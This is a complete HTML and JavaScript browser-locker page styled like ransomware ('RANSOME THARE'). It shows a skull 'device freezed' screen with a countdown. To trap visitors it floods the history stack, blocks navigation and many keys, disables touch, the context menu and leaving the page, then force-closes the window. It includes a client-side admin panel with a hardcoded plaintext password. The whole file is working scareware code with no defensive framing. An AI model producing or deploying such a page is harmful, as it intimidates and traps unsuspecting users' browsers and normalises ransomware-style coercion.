<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>RANSOME THARE - Screen Freeze</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
            min-height: 100vh;
            color: white;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            touch-action: none;
        }

        /* FREEZE SCREEN - COMPLETE BLOCK */
        .freeze-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
            z-index: 99999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 25px;
            touch-action: none;
            pointer-events: all;
        }

        .skull {
            font-size: 100px;
            margin-bottom: 25px;
            filter: drop-shadow(0 0 20px red);
            animation: shake 0.5s infinite;
        }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }

        h1 {
            font-size: 34px;
            margin-bottom: 10px;
            color: #ff4444;
            letter-spacing: 2px;
        }

        .sub {
            opacity: 0.6;
            margin-bottom: 40px;
            font-size: 14px;
        }

        .message-box {
            background: rgba(255,255,255,0.08);
            padding: 25px;
            border-radius: 25px;
            width: 85%;
            border: 1px solid rgba(255,0,0,0.3);
        }

        .label {
            font-size: 13px;
            letter-spacing: 2px;
            margin-bottom: 12px;
            color: #ff9800;
        }

        .device-id {
            font-size: 24px;
            font-weight: bold;
            font-family: monospace;
            background: rgba(0,0,0,0.5);
            padding: 12px;
            border-radius: 12px;
            letter-spacing: 2px;
        }

        .timer {
            margin-top: 30px;
            font-size: 18px;
            color: #ff9800;
        }

        .timer span {
            font-size: 32px;
            font-weight: bold;
            font-family: monospace;
        }

        .footer {
            position: absolute;
            bottom: 30px;
            font-size: 11px;
            opacity: 0.4;
        }

        /* Admin Panel */
        .admin-panel {
            display: none;
            padding: 20px;
            height: 100vh;
            overflow-y: auto;
            position: relative;
            z-index: 1;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(255,255,255,0.1);
            padding: 15px 20px;
            border-radius: 20px;
            margin-bottom: 20px;
        }

        .admin-header h1 {
            font-size: 20px;
            color: #ff9800;
            margin: 0;
        }

        .logout-btn {
            background: #dc3545;
            border: none;
            padding: 8px 18px;
            border-radius: 40px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }

        .stats {
            display: flex;
            justify-content: space-between;
            background: rgba(0,0,0,0.5);
            padding: 18px;
            border-radius: 20px;
            margin-bottom: 20px;
        }

        .stat {
            text-align: center;
        }

        .stat .number {
            font-size: 34px;
            font-weight: bold;
            color: #ff9800;
        }

        .stat .label {
            font-size: 12px;
            opacity: 0.7;
        }

        .device-card {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .device-card h3 {
            margin-bottom: 15px;
            color: #ff9800;
        }

        .device-list {
            max-height: 350px;
            overflow-y: auto;
        }

        .device-item {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }

        .device-info .device-id {
            font-family: monospace;
            font-size: 14px;
            font-weight: bold;
            background: transparent;
            padding: 0;
        }

        .device-info .status {
            font-size: 11px;
            padding: 3px 10px;
            border-radius: 20px;
            background: #dc3545;
            margin-top: 5px;
            display: inline-block;
        }

        .force-unlock-btn {
            background: #ff9800;
            border: none;
            padding: 10px 18px;
            border-radius: 40px;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }

        .add-section {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .add-section input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 40px;
            font-size: 14px;
            text-align: center;
        }

        .add-section button {
            padding: 12px 20px;
            background: #2196F3;
            border: none;
            border-radius: 40px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }

        /* Success Toast */
        .success-toast {
            position: fixed;
            bottom: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            z-index: 200000;
            display: none;
            white-space: nowrap;
            box-shadow: 0 0 20px rgba(76,175,80,0.5);
        }
    </style>
</head>
<body>

    <!-- FREEZE SCREEN -->
    <div id="freezeScreen" class="freeze-screen">
        <div class="skull">💀</div>
        <h1>DEVICE FREEZED</h1>
        <div class="sub">Screen is temporarily locked</div>
        <div class="message-box">
            <div class="label">🔒 DEVICE ID</div>
            <div class="device-id" id="frozenDeviceId">----</div>
        </div>
        <div class="timer">
            ⏳ Screen will unlock in <span id="countdown">120</span> seconds
        </div>
        <div class="footer">⚠️ Please wait... Screen will work automatically</div>
    </div>

    <!-- ADMIN PANEL -->
    <div id="adminPanel" class="admin-panel">
        <div class="admin-header">
            <h1>👑 RANSOME THARE - ADMIN PANEL</h1>
            <button class="logout-btn" onclick="adminLogout()">LOGOUT</button>
        </div>

        <div class="stats">
            <div class="stat">
                <div class="number" id="totalDevices">0</div>
                <div class="label">Total Devices</div>
            </div>
            <div class="stat">
                <div class="number" id="frozenDevices">0</div>
                <div class="label">Frozen</div>
            </div>
        </div>

        <div class="device-card">
            <h3>📱 FROZEN DEVICES</h3>
            <div class="device-list" id="deviceList">
                <p style="text-align:center;opacity:0.6;">No frozen devices</p>
            </div>
            <div class="add-section">
                <input type="text" id="newDeviceId" placeholder="New Device ID (or auto)">
                <button onclick="addDevice()">➕ ADD</button>
            </div>
        </div>
    </div>

    <!-- SUCCESS TOAST -->
    <div id="successToast" class="success-toast">✅ SCREEN UNFROZEN!</div>

    <script>
        // ========== PASSWORDS ==========
        const ADMIN_PASSWORD = "8708250548";
        
        // ========== DATA ==========
        let frozenDevices = JSON.parse(localStorage.getItem('ransome_devices') || '[]');
        let isAdminLoggedIn = localStorage.getItem('ransome_admin') === 'true';
        let currentDeviceId = localStorage.getItem('ransome_current_device') || null;
        let freezeTimer = null;
        let countdownInterval = null;

        // ========== GENERATE DEVICE ID ==========
        function generateDeviceId() {
            return 'DEV-' + Math.floor(10000 + Math.random() * 90000).toString();
        }

        // ========== SAVE & UPDATE ==========
        function saveDevices() {
            localStorage.setItem('ransome_devices', JSON.stringify(frozenDevices));
            updateAdminList();
        }

        function updateAdminList() {
            if (!isAdminLoggedIn) return;
            
            document.getElementById('totalDevices').innerText = frozenDevices.length;
            document.getElementById('frozenDevices').innerText = frozenDevices.length;
            
            const container = document.getElementById('deviceList');
            if (frozenDevices.length === 0) {
                container.innerHTML = '<p style="text-align:center;opacity:0.6;">No frozen devices</p>';
            } else {
                container.innerHTML = '';
                frozenDevices.forEach(device => {
                    const div = document.createElement('div');
                    div.className = 'device-item';
                    div.innerHTML = `
                        <div class="device-info">
                            <div class="device-id">🔒 ${device.id}</div>
                            <div class="status">FROZEN</div>
                        </div>
                        <button class="force-unlock-btn" onclick="forceUnfreeze('${device.id}')">🔓 FORCE UNFREEZE</button>
                    `;
                    container.appendChild(div);
                });
            }
        }

        // ========== ADD DEVICE ==========
        function addDevice() {
            let id = document.getElementById('newDeviceId').value.trim();
            if (!id) {
                id = generateDeviceId();
            }
            if (id.length < 4) {
                alert('ID must be at least 4 characters!');
                return;
            }
            if (frozenDevices.find(d => d.id === id)) {
                alert('Device already exists!');
                return;
            }
            frozenDevices.push({ id: id, frozenAt: new Date().toISOString() });
            saveDevices();
            alert(`✅ Device ${id} added to freeze list!`);
            document.getElementById('newDeviceId').value = '';
        }

        // ========== START FREEZE WITH COUNTDOWN ==========
        function startFreeze(deviceId) {
            currentDeviceId = deviceId;
            localStorage.setItem('ransome_current_device', deviceId);
            
            // Show freeze screen
            document.getElementById('freezeScreen').style.display = 'flex';
            document.getElementById('frozenDeviceId').innerText = deviceId;
            document.getElementById('adminPanel').style.display = 'none';
            
            // Lock body completely
            document.body.style.overflow = 'hidden';
            document.body.style.position = 'fixed';
            
            // Push multiple history states
            for(let i = 0; i < 20; i++) {
                window.history.pushState(null, '', window.location.href);
            }
            
            // Start 120 seconds countdown
            let secondsLeft = 120;
            const countdownEl = document.getElementById('countdown');
            countdownEl.innerText = secondsLeft;
            
            if (countdownInterval) clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                secondsLeft--;
                countdownEl.innerText = secondsLeft;
                
                if (secondsLeft <= 0) {
                    clearInterval(countdownInterval);
                    unfreezeScreen();
                }
            }, 1000);
            
            // Auto unfreeze after 2 minutes
            if (freezeTimer) clearTimeout(freezeTimer);
            freezeTimer = setTimeout(() => {
                unfreezeScreen();
            }, 120000);
        }

        // ========== UNFREEZE SCREEN ==========
        function unfreezeScreen() {
            if (freezeTimer) clearTimeout(freezeTimer);
            if (countdownInterval) clearInterval(countdownInterval);
            
            // Remove from frozen list
            if (currentDeviceId) {
                frozenDevices = frozenDevices.filter(d => d.id !== currentDeviceId);
                saveDevices();
            }
            
            // Show success message
            const toast = document.getElementById('successToast');
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 2000);
            
            // Auto exit browser after unfreeze
            setTimeout(() => {
                window.close();
                window.location.href = 'about:blank';
            }, 1500);
        }

        // ========== ADMIN FORCE UNFREEZE ==========
        function forceUnfreeze(deviceId) {
            const deviceExists = frozenDevices.find(d => d.id === deviceId);
            if (!deviceExists) {
                alert(`❌ Device ${deviceId} not found!`);
                return;
            }
            
            if (currentDeviceId === deviceId) {
                if (freezeTimer) clearTimeout(freezeTimer);
                if (countdownInterval) clearInterval(countdownInterval);
                unfreezeScreen();
            } else {
                frozenDevices = frozenDevices.filter(d => d.id !== deviceId);
                saveDevices();
                alert(`✅ Device ${deviceId} has been UNFROZEN!`);
            }
        }

        // ========== ADMIN FUNCTIONS ==========
        function showAdminLogin() {
            const password = prompt("🔐 ADMIN LOGIN\n\nEnter Password:");
            if (password === ADMIN_PASSWORD) {
                isAdminLoggedIn = true;
                localStorage.setItem('ransome_admin', 'true');
                showAdminPanel();
            } else if (password !== null) {
                alert("❌ Wrong Password!");
                showAdminLogin();
            }
        }

        function adminLogout() {
            isAdminLoggedIn = false;
            localStorage.removeItem('ransome_admin');
            location.reload();
        }

        function showAdminPanel() {
            if (freezeTimer) clearTimeout(freezeTimer);
            if (countdownInterval) clearInterval(countdownInterval);
            document.getElementById('adminPanel').style.display = 'block';
            document.getElementById('freezeScreen').style.display = 'none';
            updateAdminList();
        }

        // ========== COMPLETE TRAP - NO EXIT ==========
        window.addEventListener('popstate', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                for(let i = 0; i < 20; i++) {
                    window.history.pushState(null, '', window.location.href);
                }
            }
        });

        window.addEventListener('beforeunload', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                e.preventDefault();
                e.returnValue = '🔒 SCREEN FROZEN! Please wait ' + document.getElementById('countdown')?.innerText + ' seconds.';
                return '🔒 SCREEN FROZEN! Please wait.';
            }
        });

        document.addEventListener('keydown', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab'];
                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                    e.preventDefault();
                    return false;
                }
            }
        });

        let touchStartX = 0;
        document.addEventListener('touchstart', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                touchStartX = e.touches[0].clientX;
                e.preventDefault();
            }
        });
        document.addEventListener('touchmove', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                e.preventDefault();
            }
        });
        document.addEventListener('touchend', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                e.preventDefault();
            }
        });

        document.addEventListener('contextmenu', function(e) {
            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                e.preventDefault();
                return false;
            }
        });

        if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
            setInterval(() => {
                if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                    window.history.pushState(null, '', window.location.href);
                }
            }, 200);
        }

        // ========== INIT ==========
        function init() {
            const urlParams = new URLSearchParams(window.location.search);
            const deviceId = urlParams.get('id');
            
            if (deviceId) {
                const isFrozen = frozenDevices.find(d => d.id === deviceId);
                if (isFrozen) {
                    startFreeze(deviceId);
                } else {
                    showAdminLogin();
                }
            } else {
                const newId = generateDeviceId();
                if (!frozenDevices.find(d => d.id === newId)) {
                    frozenDevices.push({ id: newId, frozenAt: new Date().toISOString() });
                    saveDevices();
                }
                window.location.href = `?id=${encodeURIComponent(newId)}`;
            }
        }

        window.adminLogout = adminLogout;
        window.addDevice = addDevice;
        window.forceUnfreeze = forceUnfreeze;
        window.showAdminLogin = showAdminLogin;

        if (isAdminLoggedIn) {
            showAdminPanel();
        } else if (currentDeviceId && frozenDevices.find(d => d.id === currentDeviceId)) {
            startFreeze(currentDeviceId);
        } else {
            init();
        }
    </script>
</body>
</html>
